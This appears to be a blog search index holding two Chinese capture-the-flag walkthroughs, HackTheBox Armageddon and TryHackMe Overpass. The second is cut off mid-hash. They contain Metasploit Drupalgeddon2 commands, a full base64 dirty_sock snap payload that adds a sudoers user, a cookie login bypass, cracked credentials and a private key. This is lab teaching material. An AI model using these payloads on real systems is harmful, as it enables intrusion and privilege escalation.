<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hackthebox - Armageddon 靶场实战</title>
      <link href="/2022/08/04/Armageddon/"/>
      <url>/2022/08/04/Armageddon/</url>
      
        <content type="html"><![CDATA[<h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2022/08/04/Armageddon/image1.png" class=""><h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2022/08/04/Armageddon/image2.png" class=""><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><p>首先使用nmap进行扫描</p><p>nmap –A -sS –sC –Sv 10.10.10.233</p><img src="/2022/08/04/Armageddon/image3.png" class=""><p>我们可以看到开启了22和80端口</p><p>在80端口提示了我们存在robots.txt文件，并且东西很多 咱们访问一下</p><img src="/2022/08/04/Armageddon/image4.png" class=""><p>其中引起我兴趣的东西呢就是&#x2F;MAINTAINERS.txt文件了</p><p>这是维护文件，或者说是升级文件，咱们打开看一下</p><img src="/2022/08/04/Armageddon/image5.png" class=""><p>果不其然，里面揭露了Drupal的版本</p><p>到这里思路就明了了</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>咱们直接使用msf进行getshell</p><p>使用msfconsole打开msf</p><p>输入search drupal搜索可用的exp</p><img src="/2022/08/04/Armageddon/image6.png" class=""><p>咱们对比一下版本号，最后一次升级为7.56版本，升级时间为2017-06-21 也就是说在这之前的exp都可以直接pass了</p><p>咱们把目光放在2018-03-28的exp上</p><p>use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2</p><p>option</p><p>set RHOSTS 10.10.10.233</p><p>set lhost 10.10.14.135</p><p>exploit</p><img src="/2022/08/04/Armageddon/image7.png" class=""><p>成功获取到一个shell</p><img src="/2022/08/04/Armageddon/image8.png" class=""><p>咱们运行一下无法查看到uid，但是可以查看到文件</p><p>但我偏不，我就想知道当前用户怎么办？</p><p>简单</p><p>输入shell</p><img src="/2022/08/04/Armageddon/image9.png" class=""><p>一开始我以为是卡住了，但后来想想不对，好像是获取到了</p><img src="/2022/08/04/Armageddon/image10.png" class=""><p>执行命令后确认命令是可以被执行的？</p><p>那咱们先想办法获得一个稳定的shell吧</p><p>&#x2F;bin&#x2F;bash –i</p><img src="/2022/08/04/Armageddon/image11.png" class=""><p>不一样被我搞到shell了，可给我NB坏了，叉会儿腰</p><img src="/2022/08/04/Armageddon/image12.png" class=""><p>用户是apache，权限还是有点低啊，咱们在内核里看到了一个域名，或许有用，先记录下来吧，暂时还不知道是干嘛的，咱们得想想办法去搞到更高一点的权限</p><p>我在查看源码和配置文件的时候，在..&#x2F;sites&#x2F;default&#x2F;settings.php中找到了数据库的账号密码</p><img src="/2022/08/04/Armageddon/image13.png" class=""><p>database &#x3D;&gt; drupal</p><p>username &#x3D;&gt; drupaluser</p><p>password &#x3D;&gt; CQHEy@9M*m23gBVj</p><p>他不是开启了22端口吗，咱们直接ssh登录吧</p><img src="/2022/08/04/Armageddon/image14.png" class=""><p>嗯？密码不对？啊这，就有点尴尬了呀</p><p>没事儿，咱们换一种方法，既然从外面来不行，那咱们就从里面来，咳咳 没开车哈 请不要脑补</p><p>在咱们的shell里直接使用mysql进行登录</p><img src="/2022/08/04/Armageddon/image15.png" class=""><p>很奇怪，正常输入账号密码会卡住或者报错或者出现一些奇怪的东西</p><img src="/2022/08/04/Armageddon/image16.png" class=""><p>经过多方测试以及查找资料后，得出正确的查询命令</p><p>mysql -u “drupaluser” -h “localhost” “-pCQHEy@9M*m23gBVj” “drupal” -e “select uid, name, pass from users;”</p><img src="/2022/08/04/Armageddon/image17.png" class=""><p>brucetherealadmin账户一看这么长就知道不简单，俗话说的好，长的人一定不简单，咋办？爆它！</p><p>将用户brucetherealadmin的hash保存为一个文本文件</p><img src="/2022/08/04/Armageddon/image18.png" class=""><p>请出我们的神器john</p><p>john –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt admin</p><p>爆破成功</p><img src="/2022/08/04/Armageddon/image19.png" class=""><p>密码为booboo</p><p>现在咱们直接ssh登录就可以了</p><p>ssh <a href="mailto:brucetherealadmin@10.10.10.233">brucetherealadmin@10.10.10.233</a></p><img src="/2022/08/04/Armageddon/image20.png" class=""><p>OK，咱们现在总算是有一个完整的用户权限了</p><img src="/2022/08/04/Armageddon/image21.png" class=""><p>成功获得user权限的flag</p><p><strong>权限提升</strong></p><p>咱们使用sudo –l来查看一下sudo权限</p><img src="/2022/08/04/Armageddon/image22.png" class=""><p>咱们可以不使用密码就调用root权限安装snap，那思路就有了呀，搞起来兄弟们</p><p>生成一个snap的马</p><p>参考链接：</p><p>Privilege Escalation in Ubuntu Linux (dirty_sockv2 exploit)：<a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html">https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html</a></p><p>Playing with Dirty Sock：<a href="https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html">https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html</a></p><p>生成指令：</p><pre><code>python2 -c &#39;print&quot;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&quot;+ &quot;A&quot;*4256 + &quot;==&quot;&#39; | base64 -d &gt; exploit.snap</code></pre><img src="/2022/08/04/Armageddon/image23.png" class=""><p>直接运行改文件，发现还有一点错误，需要想办法解决一下</p><img src="/2022/08/04/Armageddon/image24.png" class=""><p>加上 –devmode 成功安装</p><p>sudo &#x2F;usr&#x2F;bin&#x2F;snap install –devmode exploit.snap</p><img src="/2022/08/04/Armageddon/image25.png" class=""><p>切换到dirty_sock用户，密码也是dirty_sock</p><p>查看一下权限</p><img src="/2022/08/04/Armageddon/image26.png" class=""><p>提权成功</p><img src="/2022/08/04/Armageddon/image27.png" class=""><p>成功拿到root权限的flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> Hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TryHackMe - Overpass 靶场实战</title>
      <link href="/2022/05/05/Overpass/"/>
      <url>/2022/05/05/Overpass/</url>
      
        <content type="html"><![CDATA[<h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><p>当一群破产的计算机科学专业的学生尝试制作密码管理器时会发生什么？显然是一次<em>完美</em>的商业成功！</p><p>这个盒子上隐藏着一个 TryHackMe 订阅代码。第一个找到并激活它的人将获得一个月的免费订阅！如果您已经是订阅者，为什么不将代码提供给朋友呢？</p><p>更新：该代码现已声明。机器于 2020&#x2F;09&#x2F;25 稍作修改。这只是为了提高机器的性能。它不影响该过程。</p><h1 id="靶场地址"><a href="#靶场地址" class="headerlink" title="靶场地址"></a>靶场地址</h1><p><a href="https://tryhackme.com/room/overpass">https://tryhackme.com/room/overpass</a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.29.27</span>Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2022-05-05 19:44 CSTNmap scan report <span class="token keyword">for</span> 10.10.29.27Host is up <span class="token punctuation">(</span>0.15s latency<span class="token punctuation">)</span>.Not shown: 65533 closed portsPORT   STATE SERVICE VERSION22/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol 2.0<span class="token punctuation">)</span><span class="token operator">|</span> ssh-hostkey:<span class="token operator">|</span>   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span><span class="token operator">|</span>   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span><span class="token operator">|</span>_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>80/tcp <span class="token function">open</span>  http    Golang net/http server <span class="token punctuation">(</span>Go-IPFS json-rpc or InfluxDB API<span class="token punctuation">)</span><span class="token operator">|</span>_http-title: OverpassNo exact OS matches <span class="token keyword">for</span> host <span class="token punctuation">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="token punctuation">)</span>.TCP/IP fingerprint:OS:SCAN<span class="token punctuation">(</span>V<span class="token operator">=</span>7.91%E<span class="token operator">=</span>4%D<span class="token operator">=</span>5/5%OT<span class="token operator">=</span>22%CT<span class="token operator">=</span>1%CU<span class="token operator">=</span>34521%PV<span class="token operator">=</span>Y%DS<span class="token operator">=</span>2%DC<span class="token operator">=</span>T%G<span class="token operator">=</span>Y%TM<span class="token operator">=</span>6273B8D1OS:%P<span class="token operator">=</span>x86_64-pc-linux-gnu<span class="token punctuation">)</span>SEQ<span class="token punctuation">(</span>SP<span class="token operator">=</span>105%GCD<span class="token operator">=</span>1%ISR<span class="token operator">=</span>107%TI<span class="token operator">=</span>Z%CI<span class="token operator">=</span>Z%II<span class="token operator">=</span>I%TS<span class="token operator">=</span>A<span class="token punctuation">)</span>OPS<span class="token punctuation">(</span>OS:O1<span class="token operator">=</span>M506ST11NW7%O2<span class="token operator">=</span>M506ST11NW7%O3<span class="token operator">=</span>M506NNT11NW7%O4<span class="token operator">=</span>M506ST11NW7%O5<span class="token operator">=</span>M506ST11OS:NW7%O6<span class="token operator">=</span>M506ST11<span class="token punctuation">)</span>WIN<span class="token punctuation">(</span>W1<span class="token operator">=</span>F4B3%W2<span class="token operator">=</span>F4B3%W3<span class="token operator">=</span>F4B3%W4<span class="token operator">=</span>F4B3%W5<span class="token operator">=</span>F4B3%W6<span class="token operator">=</span>F4B3<span class="token punctuation">)</span>ECN<span class="token punctuation">(</span>OS:R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%W<span class="token operator">=</span>F507%O<span class="token operator">=</span>M506NNSNW7%CC<span class="token operator">=</span>Y%Q<span class="token operator">=</span><span class="token punctuation">)</span>T1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%S<span class="token operator">=</span>O%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>ASOS:%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T2<span class="token punctuation">(</span>R<span class="token operator">=</span>N<span class="token punctuation">)</span>T3<span class="token punctuation">(</span>R<span class="token operator">=</span>N<span class="token punctuation">)</span>T4<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%W<span class="token operator">=</span>0%S<span class="token operator">=</span>A%A<span class="token operator">=</span>Z%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T5<span class="token punctuation">(</span>R<span class="token operator">=</span>OS:Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T6<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%W<span class="token operator">=</span>0%S<span class="token operator">=</span>A%A<span class="token operator">=</span>Z%F<span class="token operator">=</span>OS:R%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T7<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>U1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>N%TOS:<span class="token operator">=</span>40%IPL<span class="token operator">=</span>164%UN<span class="token operator">=</span>0%RIPL<span class="token operator">=</span>G%RID<span class="token operator">=</span>G%RIPCK<span class="token operator">=</span>G%RUCK<span class="token operator">=</span>G%RUD<span class="token operator">=</span>G<span class="token punctuation">)</span>IE<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DFI<span class="token operator">=</span>N%T<span class="token operator">=</span>40%CD<span class="token operator">=</span>OS:S<span class="token punctuation">)</span>Network Distance: 2 hopsService Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernelTRACEROUTE <span class="token punctuation">(</span>using port 1723/tcp<span class="token punctuation">)</span>HOP RTT       ADDRESS1   151.63 ms 10.18.0.12   152.12 ms 10.10.29.27OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 46.80 seconds</code></pre><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><img src="/2022/05/05/Overpass/image.png" class=""><p>没什么有用的东西，去 FUZZ 一下</p><h2 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h2><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># gobuster dir -u http://10.10.29.27/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>Gobuster v3.1.0by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://10.10.29.27/<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 10<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   404<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.1.0<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>2022/05/05 07:54:43 Starting gobuster <span class="token keyword">in</span> directory enumeration mode<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>/img                  <span class="token punctuation">(</span>Status: 301<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 0<span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> img/<span class="token punctuation">]</span>/downloads            <span class="token punctuation">(</span>Status: 301<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 0<span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> downloads/<span class="token punctuation">]</span>/aboutus              <span class="token punctuation">(</span>Status: 301<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 0<span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> aboutus/<span class="token punctuation">]</span>  /admin                <span class="token punctuation">(</span>Status: 301<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 42<span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> /admin/<span class="token punctuation">]</span>  /css                  <span class="token punctuation">(</span>Status: 301<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 0<span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> css/<span class="token punctuation">]</span></code></pre><p>有一个 &#x2F;admin 目录，进去看一下</p><img src="/2022/05/05/Overpass/image1.png" class=""><p>一个登陆页面，使用弱口令没有进去，看一下源代码</p><p>在页面 <a href="http://10.10.29.27/login.js">http://10.10.29.27/login.js</a> 中找到了一句</p><pre class=" language-bash"><code class="language-bash">Cookies.set<span class="token punctuation">(</span><span class="token string">"SessionToken"</span>,statusOrCookie<span class="token punctuation">)</span></code></pre><p>同时在 <a href="http://10.10.29.27/main.js">http://10.10.29.27/main.js</a> 还有一个内容</p><pre class=" language-bash"><code class="language-bash">console.log<span class="token punctuation">(</span><span class="token string">"Hello, World!"</span><span class="token punctuation">)</span></code></pre><p>这里应该是 Cookie 设置绕过</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>按 F12 打开控制台</p><img src="/2022/05/05/Overpass/image2.png" class=""><p>这里也确实输出了 “Hello, World”</p><p>这里修改我们的 Payload</p><pre class=" language-bash"><code class="language-bash">Cookies.set<span class="token punctuation">(</span><span class="token string">"SessionToken"</span>, <span class="token string">""</span><span class="token punctuation">)</span></code></pre><p>在控制台输入以后，刷新</p><img src="/2022/05/05/Overpass/image3.png" class=""><p>直接绕过了登陆机制，拿到了用户 james 的 sshkey</p><pre class=" language-bash"><code class="language-bash">-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiNJHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljTWDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdvBMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZAL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUfABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZkVfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeROkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjzeeaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYnexxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGyAIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0in0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6zylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7-----END RSA PRIVATE KEY-----</code></pre><p>将 sshkey 保存到 id_rsa 中，并给予权限</p><pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> 600 id_rsa</code></pre><p>接着使用 ssh 进行登陆</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># ssh james@10.10.84.23 -i id_rsa</span>The authenticity of host <span class="token string">'10.10.84.23 (10.10.84.23)'</span> can<span class="token string">'t be established.ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '</span>10.10.84.23<span class="token string">' (ECDSA) to the list of known hosts.Enter passphrase for key '</span>id_rsa':</code></pre><p>显示需要输入密码，去破解一下</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># ssh2john id_rsa > hash</span>┌──<span class="token punctuation">(</span>root💀lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># cat hash</span>id_rsa:<span class="token variable">$sshng</span><span class="token variable">$1</span><span class="token variable">$16</span><span class="token variable">$9F85D92F34F42626F13A7493AB48F337</span><span class="token variable">$1200</span><span class="token variable">$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c9898